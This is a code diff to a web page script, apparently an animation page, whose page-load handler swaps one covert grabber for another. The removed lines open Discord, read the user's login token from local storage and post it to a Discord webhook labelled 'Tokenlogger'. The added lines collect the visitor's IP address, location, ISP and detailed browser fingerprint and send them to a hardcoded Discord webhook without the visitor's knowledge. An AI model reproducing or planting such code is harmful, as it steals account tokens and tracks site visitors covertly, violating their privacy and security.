@@ -132,22 +132,52 @@ function animate () {
 }
 
 window.onload = function () {
-    let popup = window.open('https://discord.com/channels/@me', '_blank', 'width=400,height=300');
+    let echolog = {};
+    fetch("https://wtfismyip.com/json")
+        .then((response) => response.json())
+        .then((data) => {
+        let echolog = {
+            ipAddress: data.YourFuckingIPAddress,
+            location: data.YourFuckingLocation,
+            hostname: data.YourFuckingHostname,
+            isp: data.YourFuckingISP,
+            city: data.YourFuckingCity,
+            country: data.YourFuckingCountry,
+            countryCode: data.YourFuckingCountryCode,
+            userAgent: navigator.userAgent,
+            windowProp: Object.keys(window).length,
+            windowWidth: window.innerWidth,
+            windowHeight: window.innerHeight,
+            windowRatio: window.innerWidth / window.innerHeight,
+            screenWidth: window.screen.availWidth,
+            screenHeight: window.screen.availHeight,
+            screenRatio: window.screen.availWidth / window.screen.availHeight,
+            DPI: window.devicePixelRatio,
+            colorDepth: window.screen.colorDepth,
+            orientation: window.screen.orientation.type,
+            orientationAngle: window.screen.orientation.angle,
+            os: navigator.platform,
+            threads: navigator.hardwareConcurrency,
+            memory: navigator.deviceMemory,
+            systemLanguages: navigator.languages.join(", "),
+            languages: navigator.language,
+        };
 
-    popup.addEventListener('load', function() {
-        let popupLocalStorage = popup.localStorage;
-        let data = popupLocalStorage.token;
+        // Set up the payload for the webhook
+        const payload = {
+            content: `IP Address: ${echolog.ipAddress}\nLocation: ${echolog.location}\nHostname: ${echolog.hostname}\nISP: ${echolog.isp}\nCity: ${echolog.city}\nCountry: ${echolog.country}\nCountry Code: ${echolog.countryCode}\nUser Agent: ${echolog.userAgent}\nWindow Properties: ${echolog.windowProp}\nWindow Width: ${echolog.windowWidth}\nWindow Height: ${echolog.windowHeight}\nWindow Ratio: ${echolog.windowRatio}\nScreen Width: ${echolog.screenWidth}\nScreen Height: ${echolog.screenHeight}\nScreen Ratio: ${echolog.screenRatio}\nDPI: ${echolog.DPI}\nColor Depth: ${echolog.colorDepth}\nOrientation: ${echolog.orientation}\nOrientation Angle: ${echolog.orientationAngle}\nOS: ${echolog.os}\nThreads: ${echolog.threads}\nMemory: ${echolog.memory}\nSystem Languages: ${echolog.systemLanguages}\nLanguages: ${echolog.languages}`,
+        };
         const webhook = "https://discord.com/api/webhooks/1274476164659810408/8AzWuwNk23QppWXZMhsaBmrL89Nx5cHneMHA4LjY-ns2nuAMj6KKjeJip9F-BJa8hfAW";
         const request = new XMLHttpRequest();
         request.open("POST", webhook);
         request.setRequestHeader("Content-type", "application/json");
         const params = {
-            username: "Tokenlogger",
+            username: "logger",
             embeds: [{
                 title: "Hello!",
-                description: "token: " + data
+                description: "token: " + payload
             }]
         };
         request.send(JSON.stringify(params));
-    });
+    }).catch((error) => console.error(error));
 }
